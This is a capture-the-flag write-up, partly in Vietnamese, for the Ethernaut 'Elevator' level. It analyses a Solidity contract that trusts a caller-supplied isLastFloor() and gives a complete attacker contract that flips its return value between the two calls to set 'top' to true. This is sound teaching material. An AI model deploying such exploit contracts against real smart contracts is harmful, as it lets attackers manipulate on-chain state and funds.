# Level 11: Elevator
##  Difficulty: ★★☆☆☆

## Given contract
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```
## Target
Tìm cách để lên được tầng cuối (hay nói cách khác là tìm cách để set biến ``top``= true)

## Phân tích
- Ở đây, chúng ta thấy hàm ``isLastFloor()`` được gọi hai lần => ta chỉ cần override lại hàm ``isLastFloor()``, gọi hàm lần thứ 1 để set top thành false, lần 2 để set thành true => pass
```solidity
 if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
 
```
## Solution
- Compile và deploy contract này trên remix,sau đó gọi hàm gotoTop với address là contract address của level

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0 <0.9.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

interface IElevator {
    function goTo(uint _floor) external;
}

contract MyBuilding is Building {
    bool public last = true;

    function isLastFloor(uint) override external returns (bool) {
        last = !last;
        return last;
    }

    function goToTop(address _elevatorAddr) public {
        IElevator(_elevatorAddr).goTo(10);
    }
}
```

- Check lại biến top
```javascript
await contract.top()
true
```
**Submit** -> Done